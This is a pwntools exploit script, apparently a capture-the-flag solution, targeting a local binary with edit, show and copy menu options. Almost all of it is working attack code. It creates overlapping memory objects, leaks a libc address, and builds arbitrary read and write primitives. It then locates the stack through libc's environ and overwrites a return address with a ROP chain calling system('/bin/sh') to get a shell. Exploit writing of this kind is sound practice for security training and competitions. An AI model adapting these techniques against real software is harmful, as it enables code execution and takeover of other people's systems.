from pwn import *
context.arch='amd64'
context.log_level='info' if 1 else 'debug'
context.terminal=['lxterminal','-e']
p=process("./pwn")
def E(x):
    if isinstance(x,int): return str(x).encode()
    return x.encode('latin-1') if isinstance(x,str) else x
sla=lambda *a:p.sendlineafter(*map(E,a))
sa=lambda *a:p.sendafter(*map(E,a))
rcv=lambda n:p.recvn(n)
rcu=lambda x,d=True:p.recvuntil(E(x),drop=d)
rl=lambda k=False:p.recvline(keepends=k)

def edit(leg,id,ct):
    sla("?",1)
    sla("?",leg)
    sla("?",id)
    sla("?",ct)
def show(leg,id):
    sla("?",2)
    sla("?",leg)
    sla("?\n",id)
    return rl()
def cpy(legid,newid):
    sla("?",3)
    sla("?",newid)
    sla("?",legid)

def r64(addr):
    edit(1,0,p64(addr)+p64(8)*3)
    return u64(show(0,4))
def w64(addr,val):
    edit(1,0,p64(addr)+p64(32)*3)
    edit(0,4,p64(val))

edit(1,1,b'a')
edit(1,2,b'a'*96)
edit(0,0,b'a'*4096)
edit(0,1,b'a'*1000)
#input()
cpy(1,4) # overlap
#input()
edit(1,0,b'\x00'*32) # zero fake string
cpy(2,4) # overlap 2
#input()
edit(1,0,b'') # modify addr
#input()
libc=ELF("./libc.so.6")
libc.address=u64(show(0,4)[0x38:0x40])-0x7f587a9f2210+0x7f587a819000
print(hex(libc.address)) 
env=r64(libc.sym['environ'])
ret=env-0x7fff42985c38+0x7fff42985b18
w64(ret,libc.address+0x0000000000023835) #pop rdi
w64(ret+8,next(libc.search(b'/bin/sh')))
w64(ret+16,libc.address+0x0000000000023836) # nop
w64(ret+24,libc.sym['system'])
sla("?",4)
p.interactive()

